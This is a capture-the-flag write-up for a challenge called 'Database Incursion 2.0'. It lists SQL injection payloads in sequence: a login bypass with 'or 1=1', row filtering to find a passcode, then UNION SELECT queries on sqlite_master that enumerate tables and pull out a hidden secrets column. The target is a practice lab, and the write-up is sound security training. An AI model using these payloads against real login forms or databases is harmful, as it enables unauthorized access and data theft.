# Database Incursion 2.0
This challenge asks us to login to a website, but we dont know the password. We then overcome multiple such levels using sql commands and finally find the flag.
# Working
We first put the payload: admin' or 1=1;--. 

After this, we see a list of people with their names, email and their notes. One of the notes says "	I heard someone from Management has the passcode". 

After this we use the payload: ' or Department="Management";--

This takes us to a page with David from Management with a note "Talk to Kiwi, she has the passcode."

We then use the payload: ' or (Department="Management" and Name="Kiwi");--

We then see Kiwi from management with the passcode "ecSKsN7SES" in her notes and then login.

After this, we see a page with different tables and their contents, so we check all the tables and their contents one by one. We notice that there are 4 columns.

We then use the payload: ' UNION SELECT name, type, sql, NULL FROM sqlite_master--

We then see a page with "CITADEL_ARCHIVE_2077	table	CREATE TABLE CITADEL_ARCHIVE_2077 ( secrets TEXT )	None". 

After this we use the payload: ' UNION SELECT secrets, NULL, NULL, NULL FROM "CITADEL_ARCHIVE_2077"-- and we get the flag.
# Flag
Flag: CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}

# Resources
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

https://portswigger.net/web-security/sql-injection/union-attacks



